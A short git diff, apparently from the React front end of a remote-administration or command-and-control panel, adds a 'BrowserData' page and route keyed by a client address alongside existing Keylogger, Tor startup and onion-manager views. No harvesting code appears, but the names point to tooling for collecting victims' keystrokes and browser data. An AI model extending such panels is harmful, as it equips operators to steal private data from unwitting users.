@@ -28,6 +28,7 @@ import { OnionManager } from "./pages/OnionManager";
 import { TorStartupModal } from "./components/TorStartupModal";
 import { useLocation } from "react-router-dom";
 import { Keylogger } from "./pages/Keylogger";
+import { BrowserData } from "./pages/BrowserData";
 
 const TorStartupModalContainer: React.FC = () => {
   const location = useLocation();
@@ -141,6 +142,14 @@ export const App: React.FC = () => {
               }}
             >
               <Keylogger />
+            </WindowWrapper>
+          }
+        />
+        <Route
+          path="/browser-data/:addr"
+          element={
+            <WindowWrapper feature_cleanup={() => {}}>
+              <BrowserData />
             </WindowWrapper>
           }
         />
